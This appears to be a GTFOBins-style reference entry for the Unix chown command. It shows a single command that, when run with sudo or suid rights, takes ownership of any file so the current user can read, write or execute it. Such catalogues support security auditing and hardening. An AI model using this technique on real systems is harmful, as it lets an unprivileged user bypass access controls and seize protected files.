---
type: gtfobin
name: chown
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# chown

## privilege-escalation

```bash
chown $(id -un):$(id -gn) /path/to/input-file
```
_This can be run with elevated privileges to change ownership and then read, write, or execute a file._
**Contexts:** sudo, suid
